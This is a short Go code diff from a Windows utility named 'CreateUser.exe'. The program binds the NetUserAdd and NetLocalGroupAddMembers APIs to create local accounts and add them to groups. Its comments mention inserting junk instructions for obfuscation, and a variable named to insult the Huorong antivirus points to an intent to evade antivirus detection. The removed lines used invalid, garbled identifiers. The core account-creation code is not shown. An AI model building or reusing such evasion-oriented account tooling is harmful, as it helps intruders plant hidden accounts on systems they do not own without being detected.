@@ -10,7 +10,7 @@ import (
 )
 
 var (
-	modnetapi32 = syscall.NewLazyDLL("netapi32.dll")
+	modnetapi32                 = syscall.NewLazyDLL("netapi32.dll")
 	procNetUserAdd              = modnetapi32.NewProc("NetUserAdd")
 	procNetLocalGroupAddMembers = modnetapi32.NewProc("NetLocalGroupAddMembers")
 )
@@ -70,11 +70,11 @@ func main() {
 	var a2 string
 	a2 = "密码"
 	// 定义5A968105-605C-7A6E-7B4D-D51B7D2A9379
-	var 5A968105-605C-7A6E-7B4D string
-	5A968105-605C-7A6E-7B4D = "CreateUser.exe"
+	var Huorong_shabi string
+	Huorong_shabi = "CreateUser.exe"
 	// 检查命令行参数
 	if len(os.Args) != 3 {
-		fmt.Println("用法 : ", 5A968105-605C-7A6E-7B4D-D51B7D2A937, a1, a2)
+		fmt.Println("用法 : ", Huorong_shabi, a1, a2)
 		return
 	}
 	// 无效命令用于加花
